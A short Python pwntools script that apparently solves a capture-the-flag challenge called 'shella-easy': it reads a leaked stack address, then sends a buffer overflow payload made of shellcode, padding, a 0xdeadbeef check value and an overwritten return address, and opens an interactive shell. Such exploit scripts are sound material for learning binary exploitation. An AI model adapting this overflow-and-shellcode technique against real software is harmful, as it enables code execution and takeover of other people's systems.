from pwn import *

context.clear(arch='amd64')
context.terminal = ['alacritty', '-e', 'sh', '-c']

io = process("./shella-easy")
e = ELF('./shella-easy')

io.recvuntil("have a ")
leak = io.recvn(10)

address = int(leak, 16)

# 76 - difference between input start and saved eip
# 64 - difference between input start and memory check variable (must be set to 0xdeadbeef)
payload = open("../../payloads/shellcode32/payload", mode="rb").read()
payload += b"0" * (64 - len(payload))
payload += pack(0xdeadbeef, 32, 'little')
payload += b"0"*8
payload += pack(address, 32, 'little')

io.sendline(payload)

io.interactive()
